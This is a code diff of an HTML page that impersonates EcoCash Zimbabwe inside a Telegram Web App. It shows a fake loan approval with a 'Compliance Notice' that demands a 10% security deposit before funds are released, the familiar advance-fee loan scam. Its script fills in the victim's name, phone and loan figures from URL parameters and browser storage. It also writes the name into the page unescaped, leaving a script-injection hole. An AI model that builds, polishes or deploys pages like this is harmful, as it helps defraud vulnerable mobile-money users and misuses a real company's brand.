@@ -2,127 +2,165 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>EcoCash Zimbabwe - Success</title>
+
+    <!-- Telegram SDK -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
     <style>
-        /* --- CSS STYLES --- */
         :root {
             --ecocash-blue: #0066CC;
-            --dark-blue: #004080;
-            --light-blue: #3385D6;
-            --bg-light: #F4F7FA;
-            --text-dark: #2D3436;
-            --text-gray: #636E72;
+            --ecocash-blue-dark: #004080;
+            --ecocash-gradient: linear-gradient(180deg, #0077E6 0%, #004080 100%);
+            --ecocash-card-gradient: linear-gradient(135deg, #0066CC 0%, #004080 100%);
+            --text-dark: #121820;
+            --text-muted: #5A6577;
+            --bg-white: #FFFFFF;
+            --soft-blue-bg: #EFF6FF;
+            --soft-blue-border: #BFDBFE;
+            --notice-bg: #F4F8FF;
+            --notice-border: #0066CC;
+            --notice-title: #004080;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(180deg, #0066CC 0%, #004080 100%);
+            background: var(--ecocash-gradient);
             margin: 0;
+            padding: 20px 15px;
             display: flex;
-            justify-content: center;
-            padding: 20px;
+            flex-direction: column;
+            align-items: center;
             min-height: 100vh;
-            box-sizing: border-box;
         }
 
         .screen-container {
             width: 100%;
             max-width: 400px;
-            background-color: white;
-            border-radius: 30px;
-            overflow: hidden;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            background-color: var(--bg-white);
+            border-radius: 28px;
+            padding: 30px 20px;
+            box-shadow: 0 12px 28px rgba(0, 32, 77, 0.25);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
-        .main-content {
-            padding: 25px;
-        }
-
-        /* Top Header */
-        .header-section {
-            text-align: center;
-            padding-top: 10px;
-        }
-
+        /* Checkmark Circle Icon */
         .check-circle {
-            width: 70px;
-            height: 70px;
-            background-color: var(--ecocash-blue);
-            color: white;
+            width: 80px;
+            height: 80px;
+            background: var(--ecocash-card-gradient);
+            color: #FFFFFF;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 40px;
-            margin: 0 auto 15px;
+            font-size: 38px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 16px rgba(0, 102, 204, 0.35);
         }
 
+        /* Title Header */
         .congrats-title {
             font-size: 24px;
-            font-weight: bold;
-            color: var(--text-dark);
-            margin: 10px 0;
+            font-weight: 800;
+            color: var(--ecocash-blue-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            text-align: center;
         }
 
         .sub-text {
-            color: var(--text-gray);
-            font-size: 14px;
-            margin-bottom: 20px;
+            color: var(--text-muted);
+            font-size: 15px;
+            text-align: center;
+            line-height: 1.45;
+            margin-bottom: 25px;
+            padding: 0 10px;
         }
 
-        /* Amount Box */
+        .sub-text b {
+            color: var(--ecocash-blue);
+        }
+
+        /* Approved Amount EcoCash Card */
         .amount-box {
-            background: linear-gradient(135deg, #0066CC, #004080);
-            border-radius: 15px;
-            padding: 20px;
+            width: 100%;
+            background: var(--ecocash-card-gradient);
+            border-radius: 16px;
+            padding: 22px 15px;
             text-align: center;
-            color: white;
-            margin-bottom: 20px;
+            color: #FFFFFF;
+            margin-bottom: 25px;
+            box-shadow: 0 6px 16px rgba(0, 64, 128, 0.3);
         }
 
         .amount-label {
-            font-size: 11px;
+            font-size: 12px;
+            font-weight: 800;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            opacity: 0.9;
+            letter-spacing: 0.8px;
+            opacity: 0.92;
+            margin-bottom: 8px;
         }
 
         .amount-value {
-            font-size: 36px;
-            font-weight: 800;
-            margin-top: 5px;
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
         }
 
-        /* Info Boxes */
+        /* Notice Card */
         .info-card {
-            background-color: #FEFCE8;
-            border: 1px solid #FEF08A;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 20px;
+            width: 100%;
+            background-color: var(--notice-bg);
+            border: 1.5px solid var(--notice-border);
+            border-radius: 16px;
+            padding: 20px 18px;
+            margin-bottom: 25px;
         }
 
         .info-header {
             display: flex;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 8px;
-            color: #854D0E;
-            font-weight: bold;
-            font-size: 13px;
+            gap: 8px;
+            margin-bottom: 12px;
+            color: var(--notice-title);
+            font-weight: 800;
+            font-size: 14px;
+            letter-spacing: 0.5px;
         }
 
         .info-body {
-            font-size: 13px;
-            line-height: 1.5;
-            color: #713F12;
+            font-size: 13.5px;
+            line-height: 1.55;
+            color: var(--text-dark);
         }
 
         /* Detail List */
         .details-list {
-            margin-top: 20px;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .details-heading {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--ecocash-blue-dark);
         }
 
         .detail-item {
@@ -133,76 +171,287 @@
         }
 
         .icon-bg {
-            width: 45px;
-            height: 45px;
-            background-color: #EFF6FF;
-            border-radius: 10px;
+            width: 44px;
+            height: 44px;
+            background-color: var(--soft-blue-bg);
+            border: 1px solid var(--soft-blue-border);
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 20px;
+            color: var(--ecocash-blue);
         }
 
         .detail-label {
             font-size: 11px;
-            color: var(--text-gray);
+            color: var(--text-muted);
             text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 2px;
         }
 
         .detail-val {
-            font-size: 16px;
-            font-weight: bold;
-            color: black;
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text-dark);
         }
 
-        /* Buttons */
+        /* Quick Actions */
         .action-title {
-            font-weight: bold;
-            margin: 20px 0 15px;
-            color: var(--ecocash-blue);
+            width: 100%;
+            font-weight: 800;
+            margin: 15px 0 12px;
+            color: var(--ecocash-blue-dark);
+            font-size: 15px;
         }
 
         .btn-list {
+            width: 100%;
             display: flex;
             flex-direction: column;
             gap: 10px;
+            margin-bottom: 20px;
         }
 
         .btn-white {
-            background: white;
-            border: 1px solid #E2E8F0;
-            padding: 15px;
+            background: var(--bg-white);
+            border: 1px solid var(--soft-blue-border);
+            padding: 14px 16px;
             border-radius: 12px;
-            text-align: left;
-            font-weight: 600;
+            font-weight: 700;
             color: var(--ecocash-blue);
             cursor: pointer;
             display: flex;
             align-items: center;
             gap: 10px;
+            font-size: 14px;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+
+        .btn-white:hover {
+            background-color: var(--soft-blue-bg);
+            border-color: var(--ecocash-blue);
         }
 
         .next-steps {
-            background-color: #F8FAF5;
-            padding: 15px;
+            width: 100%;
+            background-color: var(--soft-blue-bg);
+            padding: 16px;
             border-radius: 12px;
-            margin-top: 20px;
-            border: 1px solid #E2E8F0;
+            margin-bottom: 20px;
+            border: 1px solid var(--soft-blue-border);
         }
 
         .home-btn {
             background-color: var(--ecocash-blue);
-            color: white;
+            color: #FFFFFF;
             border: none;
             width: 100%;
-            padding: 18px;
-            border-radius: 15px;
+            padding: 16px;
+            border-radius: 12px;
             font-size: 16px;
-            font-weight: bold;
-            margin-top: 20px;
+            font-weight: 800;
             cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.35);
+            transition: background-color 0.2s;
+        }
+
+        .home-btn:hover {
+            background-color: var(--ecocash-blue-dark);
         }
     </style>
 </head>
 <body>
 
+    <div class="screen-container">
+
+        <!-- Header Checkmark -->
+        <div class="check-circle">✓</div>
+
+        <div class="congrats-title" id="congrats-title">
+            <span>🎉</span> Congratulations!
+        </div>
+
+        <div class="sub-text">
+            Your EcoCash loan has been <b>approved!</b> Funds will be disbursed shortly.
+        </div>
+
+        <!-- Approved Amount EcoCash Card -->
+        <div class="amount-box">
+            <div class="amount-label">APPROVED AMOUNT</div>
+            <div class="amount-value" id="display-amount">$100.00</div>
+        </div>
+
+        <!-- Compliance Notice -->
+        <div class="info-card">
+            <div class="info-header">⚠️ COMPLIANCE NOTICE</div>
+            <div class="info-body">
+                Your EcoCash account must remain active and maintain a security balance of at least <b>10% (<span id="display-deposit">$10.00</span>)</b> of your requested loan amount. This security deposit is fully refundable upon successful loan repayment and unlocks higher limits.
+            </div>
+        </div>
+
+        <!-- Details Section -->
+        <div class="details-list">
+            <div class="details-heading">
+                <span>💳</span> Loan Details
+            </div>
+
+            <div class="detail-item" id="name-row" style="display: none;">
+                <div class="icon-bg">👤</div>
+                <div>
+                    <div class="detail-label">APPLICANT NAME</div>
+                    <div class="detail-val" id="display-name"></div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📱</div>
+                <div>
+                    <div class="detail-label">PHONE NUMBER</div>
+                    <div class="detail-val" id="display-phone">+263 ...</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">💵</div>
+                <div>
+                    <div class="detail-label">MONTHLY REPAYMENT</div>
+                    <div class="detail-val" id="display-monthly">$9.00</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📅</div>
+                <div>
+                    <div class="detail-label">LOAN TENURE</div>
+                    <div class="detail-val" id="display-term">12 Months</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📈</div>
+                <div>
+                    <div class="detail-label">INTEREST RATE</div>
+                    <div class="detail-val" id="display-rate">8% APR</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Quick Actions -->
+        <div class="action-title">Quick Actions</div>
+        <div class="btn-list">
+            <div class="btn-white">💰 Deposit</div>
+            <div class="btn-white">💸 Withdraw</div>
+            <div class="btn-white">📄 Statements</div>
+        </div>
+
+        <!-- Next Steps -->
+        <div class="next-steps">
+            <div style="font-weight: 800; color: var(--ecocash-blue-dark); margin-bottom: 6px; font-size: 14px;">📱 Next Steps:</div>
+            <div style="font-size: 13px; color: var(--text-muted); line-height: 1.45;">
+                You will receive an EcoCash confirmation SMS with your disbursement details within 24 hours.
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/index.html'">🏠 Back to Home</button>
+
+    </div>
+
+    <script>
+        function getRecordedField(keys, fallback = null) {
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const key of keys) {
+                const urlVal = urlParams.get(key);
+                if (urlVal !== null && urlVal !== '') return urlVal;
+
+                const localVal = localStorage.getItem(key);
+                if (localVal !== null && localVal !== '') return localVal;
+
+                const sessionVal = sessionStorage.getItem(key);
+                if (sessionVal !== null && sessionVal !== '') return sessionVal;
+            }
+            return fallback;
+        }
+
+        function detectCurrencyCode(currencyRaw, amountRaw) {
+            const combined = `${currencyRaw || ''} ${amountRaw || ''}`.toUpperCase();
+            if (combined.includes('ZWL') || combined.includes('ZWG')) return combined.includes('ZWG') ? 'ZWG' : 'ZWL';
+            if (combined.includes('MWK') || combined.includes('MK')) return 'MWK';
+            if (combined.includes('KES') || combined.includes('KSH')) return 'KES';
+            if (combined.includes('ZAR') || combined.includes('RAND')) return 'ZAR';
+            if (combined.includes('GBP')) return 'GBP';
+            if (combined.includes('EUR')) return 'EUR';
+            if (combined.includes('USD') || combined.includes('$')) return '$';
+            return currencyRaw ? currencyRaw.trim() : '$';
+        }
+
+        function formatMoney(amount, currencySymbol) {
+            const isWholeCurrency = ['MWK', 'KES', 'ZWL', 'ZWG'].includes(currencySymbol.toUpperCase());
+            const formattedNumber = amount.toLocaleString('en-US', {
+                minimumFractionDigits: isWholeCurrency ? 0 : 2,
+                maximumFractionDigits: isWholeCurrency ? 0 : 2
+            });
+            return currencySymbol === '$' ? `$${formattedNumber}` : `${currencySymbol} ${formattedNumber}`;
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            // Retrieve recorded values from previous pages (URL, localStorage, or sessionStorage)
+            const rawName = getRecordedField(['full_name', 'fullName', 'applicant_name', 'name']);
+            const rawPhone = getRecordedField(['user_phone_number', 'phone_number', 'phone', 'userPhone', 'ecocash_number']);
+            const rawCurrency = getRecordedField(['currency', 'selected_currency', 'loan_currency']);
+            const rawAmount = getRecordedField(['loan_amount', 'loanAmount', 'amount'], '100');
+            const rawTerm = getRecordedField(['loan_term', 'loanTerm', 'duration', 'tenure', 'months'], '12');
+            const rawRate = getRecordedField(['interest_rate', 'interestRate', 'apr'], '8');
+            const rawMonthly = getRecordedField(['monthly_repayment', 'monthlyRepayment', 'monthly_payment', 'monthly']);
+
+            const currencySymbol = detectCurrencyCode(rawCurrency, `${rawAmount} ${rawMonthly || ''}`);
+
+            const numAmount = parseFloat(String(rawAmount).replace(/[^0-9.]/g, '')) || 100;
+            const numTerm = parseInt(String(rawTerm).replace(/[^0-9]/g, ''), 10) || 12;
+            const numRate = parseFloat(String(rawRate).replace(/[^0-9.]/g, '')) || 8;
+
+            let numMonthly;
+            if (rawMonthly) {
+                numMonthly = parseFloat(String(rawMonthly).replace(/[^0-9.]/g, ''));
+            } else {
+                const monthlyRate = (numRate / 100) / 12;
+                numMonthly = (numAmount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -numTerm));
+            }
+
+            const numDeposit = numAmount * 0.10;
+
+            let formattedPhone = "+263 ...";
+            if (rawPhone) {
+                let cleanPhone = String(rawPhone).replace(/\D/g, '');
+                if (cleanPhone.startsWith('263')) {
+                    cleanPhone = cleanPhone.slice(3);
+                } else if (cleanPhone.startsWith('0')) {
+                    cleanPhone = cleanPhone.slice(1);
+                }
+                formattedPhone = cleanPhone ? `+263 ${cleanPhone}` : "+263 ...";
+            }
+
+            if (rawName) {
+                document.getElementById('congrats-title').innerHTML = `<span>🎉</span> Congratulations, ${rawName}!`;
+                document.getElementById('display-name').innerText = rawName;
+                document.getElementById('name-row').style.display = 'flex';
+            }
+
+            document.getElementById('display-amount').innerText = formatMoney(numAmount, currencySymbol);
+            document.getElementById('display-deposit').innerText = formatMoney(numDeposit, currencySymbol);
+            document.getElementById('display-phone').innerText = formattedPhone;
+            document.getElementById('display-monthly').innerText = formatMoney(numMonthly, currencySymbol);
+            document.getElementById('display-term').innerText = `${numTerm} Months`;
+            document.getElementById('display-rate').innerText = `${numRate}% APR`;
+        });
+    </script>
+</body>
+</html>
